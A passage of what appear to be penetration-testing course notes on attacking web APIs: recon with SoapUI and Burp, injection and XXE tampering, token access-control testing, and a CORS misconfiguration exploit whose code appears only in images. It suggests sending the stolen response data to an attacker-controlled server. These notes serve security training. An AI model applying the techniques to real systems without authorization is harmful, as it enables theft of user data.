+</code></pre><p id="fe189a6b-af9d-48c4-8991-07c5fe8c87ae" class="">Except For GET requests, API methods parameters are passed in the request body</p><blockquote id="5cd17678-3df6-4b46-9499-85603055926d" class="">Remember, that the meaning of these methods is a common practice and not a requirement, so technically its possible that a method you encounter does something different (e.g. POST is used For logging in)</blockquote><p id="a317f021-6a7a-4070-a24b-71103a8d0a0b" class="">An exemplary REST API request:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="416f2e5b-40a1-4475-a23c-dfe5b4c29955" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Path often contains the API version
+- Content-type application/json header is required
+- Parameters are passed as JSON array
+</code></pre><p id="ffb4bd77-0cba-4e9e-9f63-3b09d3457a74" class="">Its also often possible to pass the REST API parameters as XML, so the equivalent of the request from the previous slide would look like the listing to the right</p><p id="61db1db0-ee10-474b-8e2f-ee50388f82da" class="">REST API also has a documentation standard called the WADL file.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b7d266e6-c31a-4195-a4b3-9b2fd4e4919c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">https://www.w3.org/Submission/wadl/
+</code></pre><p id="c5d247bf-0905-4eea-9d21-ef2e8a97abb6" class="">Similar to WSDL, we will shortly present tools that help to parse the lengthy file in order not to rewrite all the methods manually.</p><ul id="cc556a4f-1d42-40b2-a0bc-4848283dd69c" class="bulleted-list"><li style="list-style-type:disc">In order to make dev (and pentester) lives easier, some APIs include a more human-friendly API representation. For example, a very popular API engine name <strong>Swagger</strong> is often found with its demo page, which contains forms with description and possibility to issue a request to each method.</li></ul><p id="bbdc3a6e-908c-44ee-b4cd-18713845324b" class="">You can see sample Swagger API here:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bfc1390a-4432-457a-936d-6500be7f0897" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">https://swagger.io/tools/swagger-ui/
+</code></pre><h3 id="d5ea8832-210c-4381-ac79-ace4afdba92a" class=""><strong>Resources</strong><strong><a href="https://johnermac.github.io/notes/ewptx/apiscloud/#resources"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3c9a8bca-2028-40ca-959e-98d2b75e49a0" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- https://swagger.io/
+- https://www.w3.org/TR/wsdl.html
+- https://www.w3.org/Submission/wadl/
+- https://www.w3.org/TR/soap/
+</code></pre><h2 id="aeaa8fb5-df9b-440d-b84f-a8f921f799f0" class=""><strong>API Testing and Attacking</strong><strong><a href="https://johnermac.github.io/notes/ewptx/apiscloud/#api-testing-and-attacking"></a></strong></h2><p id="16046a53-3585-4478-bcab-7e13b715e20c" class="">APIs are built in a way that one request path (one endpoint) allows us to call one method (execute one type of action).</p><ul id="fb474ee6-64b7-45b0-95b8-2ed4044b8185" class="bulleted-list"><li style="list-style-type:disc">The path we are requesting is an abstract mapping to some resources; that means, when requesting the endpoint /api/v3/methodName, it does not reflect file/directory structure on the server.</li></ul><ul id="5567af3a-69cc-4073-91d6-d0f3913a77c6" class="bulleted-list"><li style="list-style-type:disc">The request is processed by a special component that maps the path to certain operation handlers and not to physical file/directory resources</li></ul><ul id="e7983284-8210-4224-b986-63b4d7b5ffe4" class="bulleted-list"><li style="list-style-type:disc">However, do not be discouraged from using your favorite content discovery tools on the API enabled server. Some server paths can be mapped to the API routines, but still, some requests can be handled by the server in an original way allowing it to expose files and directories to the user.</li></ul><p id="6e764025-b34b-4cc8-8997-81f36cde012a" class="">Regardless of the fact that APIs make use of predefined methods, you should be aware that there can still be vulnerabilities related to:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0662b1c9-b340-49f3-8ffb-517e7728255a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Parameters to these predefined functions
+- The API parsing itself
+- Access to sensitive methods
+</code></pre><p id="e196c9df-9a5f-4cb9-be56-64edb14c445e" class="">First u should focus on the proper reconnaissance of the API interface:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c120334c-f9a5-4cdc-98b3-396bc4e64cc4" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- What is the API name and version?
+- Its a custom implementation or a open-source product?
+- Is there any online documentation available?
+- Are there any interesting methods?
+- Does the documentation exist on the target server (?wsdl, ?wadl, or similar)?
+- Does the API require authentication, or is publicy available?
+- If there is both local and public documentation For an API, do they match?
+- Maybe some methods were hidden from local users (typically ones that allow insecure operations)
+</code></pre><blockquote id="b48673d4-7ee7-4532-a992-344a57a6d009" class="">Gather as many API endpoints as possible U should also be able to get the WSDL/WADL file For further testing</blockquote><ul id="fdd76454-b38e-42cc-9908-63cc5b257bb6" class="bulleted-list"><li style="list-style-type:disc">Reconstructing API calls from a raw WSDL/WADL file would be time-consuming, so a proper tool might help you to do it faster.</li></ul><ul id="dab60c0e-0edd-4316-8820-67c2163c5384" class="bulleted-list"><li style="list-style-type:disc">For API testing and parsing WSDL/WADL files into a ready-to-use method set, you might want to use <strong>Postman</strong>, the free edition of <strong>SOAPUI</strong>, or the Burp PRO extension called <strong>WSDLer</strong></li></ul><h3 id="949f38c9-51f1-4597-adda-590b17c308d9" class=""><strong>SOAPUI</strong><strong><a href="https://johnermac.github.io/notes/ewptx/apiscloud/#soapui"></a></strong></h3><p id="fb5159e0-43e8-4c07-9e0a-508bf1152568" class="">→ https://www.soapui.org/downloads/latest-release.html</p><p id="2e493c86-fdc0-4438-bda9-3f8e197918eb" class="">SoapUI can be launched from its default location</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7a5fa481-149d-42af-b2e3-3864c8a859a0" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">/usr/local/bin/SoapUI-5.5.0
+locate SoapUI
+</code></pre><p id="a1419691-4c29-4699-bbab-11ca7c06128c" class="">First connect it to the proxy, in this case, the Burpsuite instance. This way, u will be able to replay and change requests issued to the API. To set up the proxy, you need to go to File</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0caa3eb5-1f85-4cd4-8921-7183f23708a6" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">  -&gt; Preferences -&gt; Proxy Settings and point it to BURP instance
+</code></pre><figure id="d5b5908f-c350-46da-9714-501e9af2dfcf" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/103.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/103.png"/></a></figure><blockquote id="79c61e7f-6c2a-4d54-b953-a57aeb910c38" class="">You can then switch the proxying on and off by clicking the Proxy Button on the upper menu.</blockquote><ul id="1316814a-78ff-45a2-9ca5-8a67cfe868f9" class="bulleted-list"><li style="list-style-type:disc">Lets now try to parse the sample WSDL/WADL file. There are sample files shipped with the software itself</li></ul><ul id="3ae30ba1-cc37-48e9-afc5-c839aa9d11aa" class="bulleted-list"><li style="list-style-type:disc">In order to load a WSDL (For SOAP) or WADL (For REST), click the respective buttons in the SoapUI on the upper menu.</li></ul><blockquote id="9cb345b0-880e-48f5-801d-7414c01d2d3b" class="">By default, u can find example WSDL/WADL files in /root/SoapUI-Tutorials/WSDL-WADL/</blockquote><ul id="d805176c-5e51-458a-8438-98ee778d6665" class="bulleted-list"><li style="list-style-type:disc">If u now click on a tree node and then double click on <strong>Request</strong>, a request window will appear. In this case, we are viewing the <strong>login</strong> method.</li></ul><figure id="c1863fbd-04ca-4cd0-80ee-7974b3108280" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/104.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/104.png"/></a></figure><p id="b9c2c2dd-3b15-4dfc-98d9-dcbc538ec8ce" class="">The method can be found in the WSDL file as well. SoapUI automatically fills argument placeholders with <strong>?</strong>. Its u who should decide what to fill in there.</p><ul id="ce703fbc-6a96-4097-8000-4227509017bf" class="bulleted-list"><li style="list-style-type:disc">In that case, we see that the application expects the argument of type <strong>String</strong></li></ul><ul id="64ace709-2795-45a2-af4d-5358db02927b" class="bulleted-list"><li style="list-style-type:disc">If u press the green button, the request will be issued and, in this case, will be proxied through Burp Suite.</li></ul><figure id="8a26f4e5-7595-4dab-8ec5-9b4ab2761c1a" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/105.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/105.png"/></a></figure><h3 id="ae8a0983-34c7-47cc-87ca-10581a337d40" class=""><strong>REST</strong><strong><a href="https://johnermac.github.io/notes/ewptx/apiscloud/#rest"></a></strong></h3><p id="a65ca3b3-3752-4ed8-8fbc-6b38331bbe4d" class="">Testing REST APIs can be done exactly in the same way; The difference is you import a WADL file instead of WSDL</p><ul id="c27b6846-b158-42d0-b38d-f9ce6641fc6e" class="bulleted-list"><li style="list-style-type:disc">So, once u encounter a WSDL on the web app, u can copy its source<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="58abb4be-1dd3-4b20-983c-77bdd7688351" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">(Open it in a Browser, go to Source, and select all -&gt; copy &amp; past to a file) and import it to SoapUI
+</code></pre></li></ul><ul id="fc0d8511-6806-4da8-bfb1-365b9f634901" class="bulleted-list"><li style="list-style-type:disc">The API is another transport mechanism For some information that is sent to the API Consumer (app back-end)</li></ul><ul id="4e39f7fd-7540-4ef4-b909-9fe6994fda38" class="bulleted-list"><li style="list-style-type:disc">With this is mind, u can try to tamper with everything that is transported by the API - For example, in case of a request similar to the previously presented one, you are free to check if the username or passwords field is vulnerable to injection attacks</li></ul><figure id="bb10133a-1c78-4da3-a742-0052afa1b9a5" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/106.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/106.png"/></a></figure><blockquote id="5852d5f5-a7df-4531-895d-a4d8a4885d46" class="">The API implementation itself might be vulnerable to XXE attacks; However, modern APIs usually disallow DTD declarations</blockquote><figure id="5450190e-53e9-4fda-a4ac-86408dca6826" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/107.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/107.png"/></a></figure><p id="623e7eaa-f6b9-4a13-bba9-3d38ca355b73" class="">Basically, u r free to tamper with any of the API parameters as long as the SOAP message structure is correct.</p><blockquote id="0721efaa-9051-46a2-be3a-6a8e8f7a61de" class="">In case u wanna to smuggle XML-style data, u can wrap them up in CDATA tags (XML comments), so the SOAP message is valid</blockquote><figure id="10974d12-cb20-4678-9e89-0a726c9fb504" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/108.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/108.png"/></a></figure><h2 id="dd7f9700-307d-4f3e-bb36-7f8ef67bdee0" class=""><strong>API Access Control</strong><strong><a href="https://johnermac.github.io/notes/ewptx/apiscloud/#api-access-control"></a></strong></h2><p id="67c4b003-13d4-4856-98f4-4cda2997539b" class="">In APIs, u will rarely see cookies being used. More often, the authentication mechanism will be basic authorization or a kind of token</p><ul id="6e554e00-0339-4231-bd50-d543f61e6078" class="bulleted-list"><li style="list-style-type:disc">It can be a pre-generated token that will be equivalent of a cookie</li></ul><p id="a79474ee-a4fb-4dc0-84e1-aac4ee3c2371" class="">For example in the form of a header like:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d70712ea-c00d-4140-bb58-cac3bbe39197" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">X-Api-Token:&lt;token&gt;
+</code></pre><ul id="7e0a42e0-596a-42bd-bfa9-2d863c9e58fd" class="bulleted-list"><li style="list-style-type:disc">What often is found in the APIs is broken access control.</li></ul><ul id="bff879ac-a963-472b-ade6-7f81d21288b9" class="bulleted-list"><li style="list-style-type:disc">Authorization Bypasses are very common</li></ul><p id="4b0166a1-1265-44c3-8f7a-4b8a53a9dd9b" class="">In order to test an API in a complex way For Access Control flaws, one need to:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="48a102a0-6fac-4cda-ae41-97aad944bcb1" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Prepare a working request to each API endpoint
+- Generate a token (or authorization header) For each of the API users
+- Combine each API request with each token to see which will work and which do not
+- Remember to test each request, also without any token
+</code></pre><ul id="ddf8e40d-be93-41d5-8c18-91376161fe9f" class="bulleted-list"><li style="list-style-type:disc">Such tests cases might be generated using SoapUI, which allows us to test issue a request to each API endpoint.</li></ul><ul id="ebf2d5a8-f364-4fc7-a3a8-66715e589630" class="bulleted-list"><li style="list-style-type:disc">Also, as a reminder, double check if the API implementation uses all the methods provided by the original version</li></ul><p id="7d1fef09-bd4e-428d-95c9-fcc2fdf519ad" class="">WIth <strong>Rundeck API</strong> there is a default possibility of running OS commands, which might be hidden from the documentation on a local API implementation.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="615ccc35-acb6-448c-81ab-61f0f2864d0e" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">https://docs.rundeck.com/docs/api/rundeck-api.html#adhoc
+</code></pre><p id="d625f12a-2463-41ac-b23f-1c8b3dbbeb72" class="">API Tokens are susceptible to vulnerabilities commonly diagnosed in session cookies, For example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0cf59e52-1023-4092-a1b3-8f2fdf045fe1" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Low entropy or predictable value
+- Lack of invalidation
+- Possible token leaks from the application infrastructure or possibility to generate tokens in advance
+</code></pre><blockquote id="d07d93b4-d82f-4b3d-9d6e-54f3f75ac2dd" class="">Tokens that might grant u access to an API interface are JWT Tokens, as well as the Bearer Authentication</blockquote><h2 id="367718d3-1c66-4eb8-ae7f-2be03f3f0df4" class=""><strong>Resource Sharing</strong><strong><a href="https://johnermac.github.io/notes/ewptx/apiscloud/#resource-sharing"></a></strong></h2><p id="ce9cbd6a-b276-40ac-937f-5620ae5bbf79" class="">As APIs are meant to be accessed by automated agents in order to lose SOP contraints a bit, the Cross-Origin Resource Sharing standard was implemented.</p><ul id="b402b914-34cd-403a-8462-b0809f072396" class="bulleted-list"><li style="list-style-type:disc">Simply put, CORS can add some exceptions to SOP by specifying some special headers in the server response.</li></ul><p id="f8054742-b6f0-4d62-8237-5d813b88c08f" class="">We will be interested in two of these headers:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8ea91ba7-a76a-4669-ac12-c551df7fecd7" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Access-Control-Allow-Origin: [value]
+- Access-Control-Allow-Credentials: [true/false]
+</code></pre><blockquote id="14552c07-aaad-4651-945b-1c9887970a6f" class="">The first one specifies a domain that can access a certain websites response The second one specifies if its possible to add credentialing information (e.g. cookies) to the request</blockquote><p id="ed75d69e-b03b-443d-bc61-6436251ea295" class="">Access-Control-Allow-Origin value can be a domain, a wildcard or null</p><ul id="f310c6a8-477e-4602-9aa2-d743447a2882" class="bulleted-list"><li style="list-style-type:disc">A wildcard means that a script hosted on any domain can access a response from that webpage</li></ul><ul id="e7a03f49-b7d4-4579-a9be-7c82a84c52c7" class="bulleted-list"><li style="list-style-type:disc">A certain domain value means that scripts (or any other user) from that domain can access the response</li></ul><p id="146d2719-2166-4aee-88a9-7bf00d718ec5" class="">If the page victim.com sends back the header <strong>Access-Control-Allow-Origin: example.com</strong>, that means that if a XHR requesting victim.com script is hosted on example.com, and if the user visits example.com, the script will access victim.com as the user and receive the response.</p><p id="49a482a4-708d-4afc-8bb6-9528601c6cdc" class="">However, if its a static page, then nothing special happens unless the victim.com allows another header <strong>Access-Control-Allow-Credentials: true</strong></p><ul id="c841f6f4-85d5-457e-8ac3-85bbc3acc83e" class="bulleted-list"><li style="list-style-type:disc">In that case, if the user is logged on victim.com and visits the mentioned script on example.com, victim.com will be visited in the context of logged-in users (the cookies will be sent with an XHR request) and restricted content can be stolen!</li></ul><ul id="4ff13d6a-7986-4fed-9522-2e96bc250194" class="bulleted-list"><li style="list-style-type:disc">Browsers by default block responses if a site is overly permissive (if they allow wildcard origin together with credentials)</li></ul><blockquote id="f637a7cd-29a0-4196-a220-5919babad301" class="">Trust with credentials to the arbritrary origin is a common vulnerability, not only in APIs.</blockquote><blockquote id="b8478826-1c87-4515-99db-f224530e9a67" class="">That means if a page is accessible only For logged in users and it trusts the arbitrary origin, an exploit script can be hosted on a attacker controlled domain.</blockquote><blockquote id="5b18f607-6208-4869-a98b-f1423f527928" class="">Once visited by a user logged in on the target website, it can steal sensitive information - user data or CSRF tokens.</blockquote><h3 id="e89bae0e-d7db-460a-96ff-da4e6a3f8cfb" class=""><strong>Simple exploitation Case</strong><strong><a href="https://johnermac.github.io/notes/ewptx/apiscloud/#simple-exploitation-case"></a></strong></h3><p id="9698b787-f14c-40ae-8b0f-e8a9b2294654" class="">Lets take a look at a simple exploitation case. We will issue a similar XHR request to a CORS-enabled page</p><p id="32c7be08-984c-4ab3-9da0-ae84a690c2c3" class="">A file is hosted on a php-enabled apache server</p><figure id="35ae6161-af0a-4a1f-8b15-9957e7ace270" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/109.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/109.png"/></a></figure><figure id="a061bf21-5902-4135-9cab-221a989acff8" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/110.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/110.png"/></a></figure><p id="13a823ed-8ba0-42a3-8a42-0545f5bb5bcc" class="">If u now navigate to that page while using BURP as a proxy, u can observe how it reacts to a custom <strong>Origin</strong> Header</p><figure id="2689e143-1388-43cd-bfe0-c1cb80065163" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/111.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/111.png"/></a></figure><p id="d2105327-c62e-4ed4-93a1-b25dd7689170" class="">The XHR script is now midified and example.com is replaced with The CORS enabled page</p><figure id="481569bd-28dc-4719-8583-f2c169e974d0" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/112.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/112.png"/></a></figure><p id="d43bcb29-c843-467f-a687-9b0de0ab98bf" class="">U can now observe that access to the response was gained. In an exploitation scenario, u may instead want to send this data to your controlled server in a similar way that you would steal a cookie using an XSS vuln.</p><figure id="c3794bc8-36f2-48f7-ac91-3a86fb0012dc" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/113.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/113.png"/></a></figure><h2 id="9202d112-4122-4e32-9615-9cd841d57bb2" class=""><strong>Attacking Cloud Based Apps</strong><strong><a href="https://johnermac.github.io/notes/ewptx/apiscloud/#attacking-cloud-based-apps"></a></strong></h2><p id="3e720a58-9048-4bbe-a6c4-36347674d60c" class=""><strong>Microservices</strong>: Different architectures and design evolution</p><h3 id="2394a03c-36cb-4544-b865-fd42e59c860a" class=""><strong>Monolithic Design:</strong><strong><a href="https://johnermac.github.io/notes/ewptx/apiscloud/#monolithic-design"></a></strong></h3><p id="a88bf7ec-b758-487b-bab0-c205017e0f4c" class="">One server is used For holding the web app and needed services such as databases. This offers an easy setup and ease of maintenance at a relatively cheap price but introduces several disadvantages.</p><ul id="d062c69a-0667-4a1e-806c-f6f71a0f89b6" class="bulleted-list"><li style="list-style-type:disc">Monolithic designs are difficult to scale and although the maintenance is relateively easy, updating the server could cause doentimes and having a single point of failure can be a disaster if there is no backup plan in place.</li></ul><h3 id="5d1cd5ee-d903-4f8e-b354-f834d58e2466" class=""><strong>Tiered Monolithic:</strong><strong><a href="https://johnermac.github.io/notes/ewptx/apiscloud/#tiered-monolithic"></a></strong></h3><p id="bbc4d0d1-f1c9-4b88-b5e7-2707be6a47c9" class="">Services are separated, the web server is holding the web app while a different server is holding the database or required services.</p><ul id="aa77e2c7-728e-42b0-95e6-5b10d18c8468" class="bulleted-list"><li style="list-style-type:disc">Tiered monolithic architecture offers the possibility of performing updates without downtime and if server are clustered and load-balanced the performance improves over the previous approach.</li></ul><ul id="a6374dbc-e3bb-4a45-97ca-f0bdfe05c6dc" class="bulleted-list"><li style="list-style-type:disc">Tiered monolithic designs are still hard to scale this is something that cannot be automated and if the cluster itself can be a single point of failure that can only be recovered from backups in case a disaster occurs.</li></ul><h3 id="140a065b-cb2b-48c3-b109-c54e8d001269" class=""><strong>Cloud Solutions:</strong><strong><a href="https://johnermac.github.io/notes/ewptx/apiscloud/#cloud-solutions"></a></strong></h3><p id="b63c002a-10b7-4520-822e-21f42bde4f7d" class="">Cloud solutions are build into elastic servers or services. This means horizontal scaling is possible to implement and fully automate, giving a better performance as new instances are created based on the resources needed.</p><ul id="3e8729a2-c221-4555-a2b2-9ea3e86c5b27" class="bulleted-list"><li style="list-style-type:disc">Updates can also be performed without downtime and disasters do not involve backups in most of the cases. Although there are a lot of advantages over the previous designs, there are still problems at the application layer as its still one big codebase (monolithic) and costs can be hard to foreseen depending on 